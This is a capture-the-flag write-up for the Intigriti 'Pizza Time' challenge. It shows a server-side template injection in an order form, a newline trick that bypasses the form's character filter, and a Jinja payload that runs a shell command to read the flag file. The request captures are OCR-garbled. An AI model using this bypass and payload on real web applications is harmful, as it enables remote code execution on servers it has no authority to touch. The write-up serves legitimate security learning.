# Pizza Time
> It's pizza time!! 🍕

## About the Challenge
We were given a website without the source code, and there is only one functionality on this website (we can place an order) and our input is reflected in the output.


[Image extracted text: [Image not found]]



[Image extracted text: [Image not found]]


## How to Solve?
Im assuming this website is vulnerable to SSTI. At first I can't input any special characters such as `$`, `[`, `]`, etc. But when I tried to use newline character or `\n`, suddenly the website didn't filter my input again.

Normal Input:

[Image extracted text: Send
Cancel
7 /"
Target:
Request
Response
Pretty
Raw
Hex
51
In
=
Pretty
Raw
Hex
Render
In
=
PosT
/order HTTP/2
HTTP/2
200
OK
2
Host
pizzatime. ctf. intigriti. io
2
Date:
Sun ,
19
Nov
2023
10:57:00
GMT
3 Content-Length:
93
3 Content-Type:
text/html;
charset-utf-8
Content-Type:
application/X-WWW-form-urlencoded
Content-Length:
35
5
5
Strict-Transport-Security:
max-age-15724800;
includeSubDomains
6
customer_name-k{7*7}}&pizza_name-Margheritaspizza_size-Small&
6
topping-Mushroomsasauce-Marinara
<p>
Invalid
characters
detected!
<[p>]


Bypass:

[Image extracted text: Request
Response
Pretty
Raw
Hex
3 In
=
Pretty
Raw
Hex
Render
In
PosT
/order
HTTP/2
HTTP/2
200
OK
2
Host:
pizzatime. ctf. intigriti. io
2
Date:
Sun,
19
Nov
2023
10:57:27
GMT
3 Content-Length:
95
3 Content-Type:
text/html;
charset-utf-8
Content-Type:
application/X-WWW-form-urlencoded
Content-Length:
99
5
5
Strict-Transport-Security: max-age-15724800 =
includeSubDomains
6
customer_name=
6
{{7*7}}epizza_name-Margheritafpizza_
size-Smalletopping-Mushrooms&
sauce-Marinara
<p>
Thank
you,
49
Your
order
has
been placed .
Final price
is
$9.72
<[pz
10]


And to obtain the flag, we need to escalate the SSTI to remote code execution. This is the final payload I used to read the flag

```
{{lipsum.__globals__.os.popen('cat$IFS/flag.txt').read()}}
```


[Image extracted text: Request
Response
Pretty
Raw
Hex
0
In
=
Pretty
Raw
Hex
Render
51
In
=
POST
/order
HTTP/2
HTTP/2
200
OK
2
Host:
pizzatime. ctf. intigriti. io
2
Date:
Sun,
19
Nov
2023
10:59:26
GMT
3 Content-Length:
146
3 Content-Type:
text/html;
charset-utf-8
Content-Type:
application/X-WWW-form-urlencoded
Content-Length:
135
5
5
Strict-Transport-Security
max-age-15724800;
includeSubDomains
6
customer_name=
6
{{lipsum
~globals_
0S . popen ( ' catsIFS/ flag
txt' ).read ( ) }}&
pizza_name-Margheritalpizza_Size-Smallatopping-Mushroomsasauce=
<p>
Marinara
Thank
you,
INTIGRITI{dld_SOm3body_54y_plzz4_7lm3} !
Your
order
has
been
placed
Final
price
is
$9_
72
p>
10]


```
INTIGRITI{d1d_50m3b0dy_54y_p1zz4_71m3}
```